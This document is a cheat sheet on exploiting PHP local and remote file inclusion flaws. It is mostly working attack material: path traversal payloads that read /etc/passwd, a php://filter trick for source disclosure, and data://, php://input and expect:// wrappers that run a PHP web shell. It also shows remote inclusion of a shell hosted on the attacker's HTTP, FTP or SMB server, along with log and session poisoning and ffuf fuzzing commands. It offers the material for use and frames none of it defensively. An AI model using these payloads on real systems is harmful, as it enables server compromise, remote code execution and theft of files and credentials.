Here is a concise guide explaining the provided commands for exploiting File Inclusion vulnerabilities.

### üìÇ Path Traversal & File Disclosure

Path traversal uses `../` to access files outside the intended directory. The goal is to read sensitive files.

  * **Basic Payloads:**

    ```shell
    # Read a standard Linux user file
    ../../../etc/passwd

    # Filter bypass by adding extra slashes or dots
    ..//..//..//etc/passwd
    ....//....//....//etc/passwd

    # Filter bypass by prepending a non-existent directory
    non_existing_directory/../../../etc/passwd/./././././
    ```

      * `../` (`%2e%2e%2f` in URL encoding) moves up one directory. You use it to escape the webroot and access system files.

  * **Reading PHP Source Code:**

    ```shell
    # Use php://filter to Base64-encode a file's source code before it's rendered
    php://filter/read=convert.base64-encode/resource=config

    # Decode the Base64 output to view the source
    echo "<base_64_encoding>" | base64 -d
    ```

  * **Discovery:**

    ```shell
    # Use ffuf to discover potentially vulnerable files
    ffuf -w /path/to/seclists/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
    ```

-----

### üí£ RCE via PHP Wrappers

These techniques turn file inclusion into Remote Code Execution (RCE) by executing code.

  * **Recon:**

    ```shell
    # Read php.ini to check for weak configurations like `allow_url_include` or `expect` extension
    curl "http://.../index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    echo '...' | base64 -d | grep 'allow_url_include\|expect'
    ```

  * **`data://` Wrapper:** Executes code directly from the URL.

    ```shell
    # The Base64 payload decodes to '<?php system($_GET["cmd"]); ?>'
    echo '<?php system($_GET["cmd"]); ?>' | base64

    # Execute 'id' and 'ls -l'
    curl -s 'http://.../index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id'
    curl -s 'http://.../index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=ls+l'
    ```

  * **`php://input` Wrapper:** Executes code sent in the body of a POST request.

    ```shell
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://.../index.php?language=php://input&cmd=id"
    ```

  * **`expect://` Wrapper:** Executes commands directly if the `expect` extension is enabled.

    ```shell
    curl -s "http://.../index.php?language=expect://id"
    ```

-----

### üåç Remote File Inclusion (RFI)

RFI includes and executes a file from an attacker-controlled server. This requires `allow_url_include = On`.

1.  **Create and Host Shell:**

    ```shell
    # Create a PHP shell file
    echo '<?php system($_GET["cmd"]); ?>' > shell.php

    # Host it on a web server
    sudo python3 -m http.server 80
    ```

2.  **Trigger Inclusion:**

    ```shell
    # Make the victim server fetch and execute your shell via HTTP
    curl 'http://<VICTIM_IP>/index.php?language=http://<YOUR_IP>/shell.php&cmd=id'
    ```

3.  **Alternative Protocols:**

    ```shell
    # Host and include via FTP
    sudo python -m pyftpdlib -p 21
    curl 'http://<VICTIM_IP>/index.php?language=ftp://user:pass@<YOUR_IP>/shell.php&cmd=id'

    # Host and include via SMB
    impacket-smbserver -smb2support share $(pwd)
    # Payload in URL: \\<YOUR_IP>\share\shell.php
    ```

-----

### üéØ LFI to RCE via File Upload & Log Poisoning

If you can write a file to the server (via upload or logs), you can include it to get RCE.

  * **File Upload Method:**

    ```shell
    # Create a fake image or zip containing a PHP payload
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    zip shell.jpg shell.php && mv shell.phar shell.jpg # Using PHAR wrapper

    # Upload the file, then include it via LFI to execute the payload
    curl 'http://.../index.php?language=./profile_images/shell.gif&cmd=ls'
    ```

  * **Log Poisoning:** Inject a PHP payload into server logs, then include the log file.

    1.  **Inject Payload:** Make a request where the User-Agent (or another logged field) is your PHP shell.
        ```shell
        # Craft a file with the malicious header
        echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
        # Make the request to get the header into the logs
        curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
        ```
    2.  **Include Log:** Use the LFI to execute the payload within the log file.
        ```shell
        # Execute commands by including the access log
        GET /index.php?language=/var/log/apache2/access.log&cmd=id HTTP/1.1
        ```

  * **Session Poisoning:** Similar to log poisoning, but the payload is injected into a session file.

    ```shell
    # 1. Inject payload into a session variable (done through application functionality).
    # 2. Find your session file (e.g., /var/lib/php/sessions/sess_...).
    # 3. Include the session file to execute the code.
    http://.../index.php?language=/var/lib/php/sessions/sess_...&cmd=pwd
    ```

-----

### ü§ñ Automation with `ffuf`

Use `ffuf` to quickly find LFI vulnerabilities by fuzzing parameters and paths. The key is to filter out normal responses using `-fs <size>`.

  * **Fuzz Parameter Names:**
    ```shell
    ffuf -w /path/to/burp-parameter-names.txt:FUZZ -u 'http://.../index.php?FUZZ=test' -fs <size>
    ```
  * **Fuzz LFI Payloads:**
    ```shell
    ffuf -w /path/to/LFI-Jhaddix.txt:FUZZ -u 'http://.../index.php?language=FUZZ' -fs <size>
    ```
  * **Fuzz File Paths:**
    ```shell
    ffuf -w /path/to/default-web-root-directory-linux.txt:FUZZ -u 'http://.../index.php?language=../../../../FUZZ/index.php' -fs <size>
    ```
  * **Fuzz for Sensitive Files:**
    ```shell
    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://.../index.php?language=../../../../FUZZ' -fs <size>
    ```
